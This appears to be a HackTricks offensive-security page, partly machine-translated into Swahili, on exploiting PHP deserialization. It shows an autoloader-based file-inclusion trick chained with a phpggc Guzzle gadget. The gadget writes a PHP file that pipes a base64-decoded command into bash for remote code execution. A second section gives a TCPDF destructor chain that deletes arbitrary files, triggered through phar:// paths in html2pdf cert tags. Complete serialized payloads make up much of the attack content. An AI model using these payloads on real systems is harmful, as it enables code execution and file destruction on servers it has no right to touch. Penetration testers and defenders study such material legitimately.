# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Tuko katika hali ambapo tumegundua **PHP deserialization in a webapp** na **hakuna** library iliyo vulnerable kwa gadgets ndani ya **`phpggc`**. Hata hivyo, katika container ile ile kulikuwa na **different composer webapp with vulnerable libraries**. Kwa hivyo, lengo lilikuwa **load the composer loader of the other webapp** na kuliabuse ili **load a gadget that will exploit that library with a gadget** kutoka kwa webapp yenye udhaifu wa deserialization.

Hatua:

- Umeipata **deserialization** na **hakuna gadget** katika msimbo wa app ya sasa
- Unaweza kuitumia vibaya function **`spl_autoload_register`** kama ifuatavyo ili **load any local file with `.php` extension`**
- Kwa ajili hiyo unatumia deserialization ambapo jina la class litawekwa ndani ya **`$name`**. Huwezi kutumia "/" au "." kwenye jina la class katika serialized object, lakini **code** inabadilisha **underscores** ("\_") kwa slashes ("/"). Kwa hivyo jina la class kama `tmp_passwd` litabadilishwa kuwa `/tmp/passwd.php` na code itajaribu kuinakili.\
Mfano wa **gadget** utakuwa: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> Ikiwa una uwezo wa **kupakia faili** na unaweza kupakia faili yenye **`.php` extension`** unaweza **kutumia vibaya kipengele hiki moja kwa moja** na kupata tayari RCE.

Katika kesi yangu, sikuwa na kitu kama hicho, lakini ndani ya **container ile ile** kulikuwa na ukurasa mwingine wa web wa composer wenye **library iliyo hatarini kwa `phpggc` gadget**.

- Ili kupakia library nyingine hii, kwanza unahitaji **kupakia composer loader ya app nyingine ya web** (kwa sababu ile ya application ya sasa haitafikia libraries za nyingine.) **Kujua path ya application**, unaweza kufanikisha hili kwa urahisi sana kwa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (Katika kesi yangu, composer loader ilikuwa katika `/www/frontend/vendor/autoload.php`)
- Sasa, unaweza **kupakia** composer loader ya app nyingine, hivyo ni wakati wa **`generate the phpgcc`** **payload** kutumia. Katika kesi yangu, nilitumia **`Guzzle/FW1`**, ambayo iliniruhusu **kuandika faili yoyote ndani ya filesystem**.
- NOTE: Gadget iliyotengenezwa haikufanya kazi; ili ifanye kazi nilibadilisha payload hiyo **`chain.php`** ya phpggc na niliweka **sifa zote** (attributes) za classes **from private to public**. Vinginevyo, baada ya kudeserialize string, attributes za objects zilizoundwa hazikuwa na thamani yoyote.
- Sasa tuna njia ya **kupakia composer loader ya app nyingine** na kuwa na **phpggc payload inayofanya kazi**, lakini tunahitaji **kufanya hili katika SAME REQUEST ili loader ipakwe wakati gadget inatumiwa**. Kwa hiyo, nilituma array iliyoserialized yenye vitu vyote viwili kama:
- Unaweza kuona **kwanza loader ikipakiwa kisha payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Sasa, tunaweza **kuunda na kuandika faili**, hata hivyo, mtumiaji **hakuweza kuandika katika folda yoyote ndani ya seva ya wavuti**. Kwa hivyo, kama unavyoona katika payload, PHP inayoita **`system`** na baadhi ya **base64** imeundwa katika **`/tmp/a.php`**. Kisha, tunaweza **kuitumia tena aina ya kwanza ya payload** ambayo tulitumia kama LFI ili kupakia composer loader ya webapp nyingine ili kupakia faili iliyoundwa **`/tmp/a.php`**. Ongeza tu kwenye deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**Muhtasari wa payload**

- **Load the composer autoload** ya webapp tofauti katika container ileile
- **Load a phpggc gadget** ili kutumia library kutoka webapp nyingine (webapp ya awali yenye udhaifu wa deserialization hakuwa na gadget yoyote kwenye maktaba zake)
- Gadget itaunda faili lenye **PHP payload** ndani yake katika /tmp/a.php yenye amri hatarishi (mtumiaji wa webapp hawezi kuandika katika folda yoyote ya webapp)
- Sehemu ya mwisho ya payload yetu itatumia **load the generated php file** ambayo itatekeleza amri

Nilihitaji **call this deserialization twice**. Katika upimaji wangu, mara ya kwanza faili `/tmp/a.php` iliundwa lakini haiku loaded, na mara ya pili ilipakiwa kwa usahihi.

## TCPDF `__destruct` POP chain kwa kufuta faili kwa hiari

Wakati mfano halisi wa `TCPDF` unapochukuliwa na garbage collector unaita `_destroy(true)`, hupitia `$this->imagekeys`, na `unlink()` chochote kinachoonekana kama faili ya cache chini ya `K_PATH_CACHE`. Ikiwa application inafanya `unserialize($user_data)` wakati class ya `TCPDF` iko loaded (mfano: inatarajia array yenye key ya `html`), unaweza kutoa object iliyoserializa ambayo inaweka:

- `file_id` kuwa integer yoyote ambayo haipo katika `self::$cleaned_ids` (mfano: `-1`).
- `imagekeys` kuwa paths zinazoanza na `K_PATH_CACHE` au ambazo zinaweza kuonekana kama hivyo (mfano: `/tmp/../tmp/do_not_delete_this_file.txt` wakati `K_PATH_CACHE` ni `/tmp/`).

Mfano wa payload inayolenga mtiririko usio salama `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);`:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### Triggering the gadget via `phar://` in html2pdf `<cert>` tags

`spipu/html2pdf` (≤5.3.0) wraps TCPDF and exposes a custom `<cert>` block whose `src`/`privkey` attributes are validated with plain `file_exists()`. On PHP < 8.0 any filesystem function that touches a `phar://` URL causes the Phar metadata to be unserialized. By storing the malicious TCPDF object above inside a Phar archive you gain a reliable POP even if the application never calls `unserialize()` itself.

1. Craft a Phar with `phar.readonly=0`, set the stub/manifest to look like an image (e.g. rename `archive.phar` to `archive.png`), and store the serialized TCPDF object in the Phar metadata.
2. Upload/place the file somewhere reachable such as `/tmp/user_files/user_1/archive.png`.
3. Submit HTML containing the tag ya `<cert>` so html2pdf resolves the attacker-controlled path:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Muitio wa `file_exists()` hurejesha metadata kutoka kwa serialization, huanzisha TCPDF, na destructor yake hufuta faili iliyochaguliwa, ikigeuza html2pdf kuwa kipenyezo chenye nguvu cha `phar://`. Toleo 5.3.1 liliweka `Security::checkValidPath()` ili kuzuia schemes zisizoidhinishwa, hivyo deployments za legacy zinabaki kuvutia.

## Marejeo

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
